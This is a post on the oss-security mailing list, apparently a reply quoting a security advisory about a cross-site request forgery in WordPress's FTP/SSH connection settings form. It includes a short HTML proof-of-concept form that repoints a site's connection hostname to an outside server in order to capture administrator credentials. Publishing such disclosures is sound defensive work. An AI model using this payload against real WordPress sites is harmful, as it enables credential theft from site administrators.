  oss-security - Re: Cross-Site Request Forgery in WordPress Connection Information            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [<thread-prev] [day] [month] [year] [list]  Date: Wed, 17 May From: Summer of Pwnage <lists@...urify.nl> To: oss-security@...ts.openwall.com Subject: Re: Cross-Site Request Forgery in WordPress Connection Information  This issue is resolved in WordPress version   On Summer of Pwnage wrote: > ------------------------------------------------------------------------ > Cross-Site Request Forgery in WordPress Connection Information > ------------------------------------------------------------------------ > Yorick Koster, July > > ------------------------------------------------------------------------ > Abstract > ------------------------------------------------------------------------ > The FTP/SSH form functionality of WordPress was found to be vulnerable > to Cross-Site Request Forgery. This vulnerability can be used to > overwrite the FTP or SSH connection settings of the affected WordPress > site. An attacker can use this issue to trick an Administrator into > logging into the attacker's FTP or SSH server, disclosing his/her login > credentials to the attacker. In order to exploit this vulnerability, the > attacker has to lure/force a logged on WordPress Administrator into > opening a malicious website. > > > ------------------------------------------------------------------------ > OVE ID > ------------------------------------------------------------------------ > > > ------------------------------------------------------------------------ > Tested versions > ------------------------------------------------------------------------ > This issue was successfully tested on the WordPress [2] version up > till and including version > > ------------------------------------------------------------------------ > Fix > ------------------------------------------------------------------------ > There is currently no fix available. > > ------------------------------------------------------------------------ > Introduction > ------------------------------------------------------------------------ > WordPress is web software you can use to create a website, blog, or > app. It was found that the FTP/SSH form functionality is vulnerable to > Cross-Site Request Forgery. This vulnerability can be used by an > attacker to overwrite the FTP or SSH connection settings of the affected > WordPress site. It can be used to trick in an Administrator into login > into the attacker's FTP or SSH server, disclosing his/her login > credentials to the attacker. > > ------------------------------------------------------------------------ > Details > ------------------------------------------------------------------------ > This issue exists in the method request_filesystem_credentials() > (/wp-admin/includes/file.php). It allows overwriting of the values: > > - hostname > - username > - connection_type > > The request_filesystem_credentials() method is called in various > locations in WordPress. The connection information is updated if a POST > request contains a password or public & private key value (in case of > connection type ssh). In order to trigger this issue, the WordPress > installation must not be able to write to the wp-content folder. Also, > the attacker has to lure/force a logged on WordPress Administrator into > opening a malicious website. > > ------------------------------------------------------------------------ > Proof of concept > ------------------------------------------------------------------------ > <html> >     <body> >         <form action="http://<target>/wp-admin/plugins.php"  > method="POST"> >             <input type="hidden" name="hostname" value="sumofpwn.nl" /> >             <input type="hidden" name="connection_type" value="ftp" /> >             <input type="hidden" name="password" value="password" /> >             <input type="submit" value="Submit request" /> >         </form> >     </body> > </html> > ------------------------------------------------------------------------ > References > ------------------------------------------------------------------------ > [1]  > > [2] https://wordpress.org/ > ------------------------------------------------------------------------ > Summer of Pwnage (https://sumofpwn.nl) is a Dutch community project. Its > goal is to contribute to the security of popular, widely used OSS > projects in a fun and educational way.  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      